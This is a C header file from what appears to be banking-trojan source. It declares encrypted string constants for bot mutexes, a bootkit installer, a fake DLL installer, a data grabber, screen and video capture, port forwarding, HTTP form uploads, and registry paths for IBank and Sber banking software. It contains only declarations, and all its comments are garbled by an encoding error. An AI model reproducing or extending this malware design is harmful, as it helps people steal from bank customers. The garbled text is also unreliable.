
//---------------------------------------------------------------------------
//  ������ �������� ��������� �������� ����
//
//  �������������: ���� 2012
//---------------------------------------------------------------------------

#ifndef StrConstsH
#define StrConstsH
//---------------------------------------------------------------------------

#include "Strings.h"

//��� ���������� ������, ������������� � ���� ����
#ifdef _MSC_VER
#	define CSSTR __declspec(align(1)) char
#else
#	define CSSTR char
#endif

//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr);





//=====================================================
//  ��������� ���������� ��������� ������
//
//
//  �������� � ��������� � ��������� EStr -
//  Encrypted String
//=====================================================

// ������� ����������� �������� ����������������, ��� ��� �������
extern CSSTR StrBotGlobalMutexName[];
//������� ���������������, ��� ������� ��� �� ��� �������
extern CSSTR StrBootkitIsRunMutex[]; 


// ������������ ��� ��� ����� ����
extern CSSTR EStrOriginalBotExeName[];


// ��� �������
extern CSSTR EStrServiceName[];

// �������������� �������
extern CSSTR EStrBotServiceExePath[];

// ��� ��� ����� ������� ����
extern CSSTR EStrBotServiceExeName[];


extern CSSTR StrBotWorkPath[];
extern CSSTR StrGrabberPath[];


// ����� ��������� ������
extern CSSTR EStrPipeLoader[]; // ��� ���������� ����� �������

// ��������� �������, ������������ ����� ����� ���������
extern CSSTR EStrProcessCommandDeleteBot[];  // ������� �� �������� exe ����


// ��� ���� ��������
extern CSSTR EStrPrefixFileName[];

// ����� ������� ���� � ���� ���
extern CSSTR EStrBotPlug[];

// ��� ���������� �������
extern CSSTR EStrBootkitInstaller[];

// ��� ����������� �������
extern CSSTR EStrFakeDllInstaller[];



// �������� ������, ������� ����� �������� ���
extern CSSTR EStrCommandInstallFakeDLL[];  // ������� �� ���������� �������
extern CSSTR EStrCommandInstallBootkit[];  // ������� �� ���������� �������



// ����� ������, ��� ���������� � ���
extern CSSTR StrLogFileScreenShot[];
extern CSSTR StrLogFileInformation[];
extern CSSTR StrLogFileNetInfo[];



// ����� ������� ���������� �����������.
extern CSSTR VideRecFuncRecordProcess[];
extern CSSTR VideRecFuncRecordWnd[];
extern CSSTR VideRecFuncStop[];
extern CSSTR VideRecFuncResetTimer[];
extern CSSTR VideRecFuncSendData[];
extern CSSTR VideRecFuncRunPortForward[];


// ��������� ������ HTTP
extern CSSTR HTTPFormContentDisposition[];
extern CSSTR HTTPFormFieldName[]; // ������ ������������ ����� ����
extern CSSTR HTTPFormFileInfo[];  // ������ ������ ������������ ���������� � ����� ����� ��� �������� �����
extern CSSTR HTTPOctetStream[];


// ������ ������ AzConfig
extern CSSTR AzConfigParamUserName[];


// ������ ������ BSS �������
extern CSSTR BSSLogTemplate[];


// ������ ������ FakeDllInstaller
extern CSSTR EStrFakeDllInstallerCommandParams[];
extern CSSTR EStrIBankRegistryPath[];
extern CSSTR EStrSberRegistryKey[];
extern CSSTR EStrIBankFileName[];




//*********************************************************************
//                            �� ����������� ������ � ������
//*********************************************************************


extern CSSTR Slash[];
extern CSSTR SlashChar;



#endif
